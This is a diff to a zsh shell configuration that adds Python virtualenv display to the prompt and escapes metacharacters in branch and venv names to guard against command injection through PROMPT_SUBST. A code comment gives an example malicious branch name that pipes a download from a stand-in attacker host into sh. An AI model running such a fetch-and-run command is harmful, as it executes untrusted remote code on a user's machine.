@@ -51,12 +51,22 @@ setopt PROMPT_SUBST           # enable ${...} and $(...) expansion in prompts
 _PROMPT_IP="$(hostname -I 2>/dev/null | awk '{print $1}')"
 : "${_PROMPT_IP:=127.0.0.1}"
 
+
+source "/home/${USER}/mainvenv/bin/activate"
+current_venv=''
 _PROMPT_SINCE=""
+
+get_venv_basename(){
+    basename $VIRTUAL_ENV | sed 's/[$`(){};]/\\&/g'
+}
+
 preexec() {
     _PROMPT_SINCE="$(date '+%Y-%m-%d %H:%M:%S')"
+    current_venv=${VIRTUAL_ENV:+($(get_venv_basename))}
 }
 precmd() {
     _PROMPT_SINCE="$(date '+%Y-%m-%d %H:%M:%S')"
+    current_venv=${VIRTUAL_ENV:+($(get_venv_basename))}
 }
 
 TMOUT=1 
@@ -64,11 +74,20 @@ TRAPALRM() {
     [[ $_CLOCK_PAUSED -eq 0 ]] && zle && zle reset-prompt
 }
 
+
 clean_branch() {
     # sanatize and prints out the current git branch. Sanatizing is extremely important since we are running PROMPT_SUBST.
     # We don't want evil people to name branches $(curl evil.com | sh)
     git branch --show-current 2>/dev/null | sed 's/[$`(){}]/\\&/g'
 }
 
-PROMPT=$'\n''%F{244}SINCE (%F{cyan}${_PROMPT_SINCE}%F{244}) UNTIL (%F{cyan}%D{%Y-%m-%d %H:%M:%S}%F{244}) - %F{green}%n@%m%f%F{244}[%F{yellow}${_PROMPT_IP}%f%F{244}] %F{blue}%~%f %F{magenta}[$(clean_branch)]%f
-> $ '
+
+
+# Setup the python virtual environment
+export VIRTUAL_ENV_DISABLE_PROMPT=1
+
+PROMPT=$'\n''%F{244}SINCE (%F{cyan}${_PROMPT_SINCE}%F{244}) UNTIL (%F{cyan}%D{%Y-%m-%d %H:%M:%S}%F{244}) - %F{green}%n@%m%f%F{244}[%F{yellow}${_PROMPT_IP}%f%F{244}] %F{magenta}[$(clean_branch)]%f
+${current_venv} %F{blue}%~%f > $ '
+
+
+export PATH="$PATH:/home/$USER/code/scripts"
